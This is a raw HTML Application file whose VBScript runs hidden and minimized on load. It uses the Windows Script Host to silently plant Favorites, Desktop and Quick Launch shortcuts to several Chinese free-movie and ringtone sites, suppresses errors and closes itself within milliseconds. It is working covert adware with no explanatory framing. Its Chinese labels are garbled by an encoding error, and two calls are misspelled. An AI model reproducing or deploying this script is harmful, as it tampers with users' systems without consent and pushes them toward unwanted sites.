   <html>
   <html><HTA:APPLICATION CAPTION=no SHOWINTASKBAR=no WINDOWSTATE=minimize>
   <body onload="window.blur();">
   <object id='wsh' classid='clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B'></object>

   <script language=VBScript>
   on error resume next
   Call LongFei_AddFavorites("¡¾MTV77Ãâ·ÑÒôÀÖ¡¿","http://www.mtv77.com/")
   Call LongFei_AddFavorites("¡¾Kan51.netÃâ·ÑµçÓ°Íø¡¿","http://www.kan51.net/")
   Call LongFei_AddFavorites("¡¾Ãâ·Ñ²ÊÐÅÁåÉù¡¿","http://www.mffdx.com/")

   on error resume next
   Call LongFei_AddDesktop("ÒôÀÖÈÎÄãÌý-MTV77","http://www.mtv77.com/")
   Call LongFei_AddDesktop("Kan51Ãâ·ÑµçÓ°","http://www.kan51.net/")
   all LongFei_AddDesktop("¡¾Ãâ·ÑÊÖ»úÁåÉù¡¿","http://www.mffdx.com/")
   all LongFei_AddDesktop("¡¾¼¤ÇéÃâ·ÑÓ°ÊÓ¡¿","http://www.d6yy.com/")

   on error resume next
   Call LongFei_AddQuickLaunch("Ãâ·ÑÔÚÏßµçÓ°","http://www.kan51.net/")

   Function LongFei_AddFavorites(N, U)
       on error resume next
       Set S = wsh.CreateShortcut(wsh.SpecialFolders("Favorites") + "/" + N +".URL")
       S.TargetPath = U
       S.Save()
       Set Sl = wsh.CreateShortcut(wsh.SpecialFolders("Favorites") + "/Á´½Ó/" + N +".URL")
       Sl.TargetPath = U
       Sl.Save()
   End Function

   Function LongFei_AddDesktop(N, U)
       on error resume next
       Set S = wsh.CreateShortcut(wsh.SpecialFolders("AllUsersDesktop") + "/" + N +".URL")
       S.TargetPath = U
       S.Save()
   End Function


   Function LongFei_AddQuickLaunch(N, U)
       If N = "" Then
           NQ = "Application Data\\Microsoft\\Internet Explorer\\Quick Launch\\Æô¶¯ Internet Explorer ä¯ÀÀÆ÷.URL"
       Else
           NQ = "Application Data\\Microsoft\\Internet Explorer\\Quick Launch\\" + N + ".URL"
       End If
       on error resume next
       TarName = "C:\\Documents and Settings\\Administrator\\" + NQ
       Set Shorcut = wsh.CreateShortcut(TarName)
       Shorcut.TargetPath = U
       Shorcut.Save()

       on error resume next
       TarName = "C:\\windows\\" + NQ
       Set Shorcut = wsh.CreateShortcut(TarName)
       Shorcut.TargetPath = "http://www.ff51.com/"
       Shorcut.Save()
   End Function
   </script>
   <script language="JScript">
   function closeit() {
   setTimeout("self.close()",5)
   }
   closeit()
   </script>
   </html>
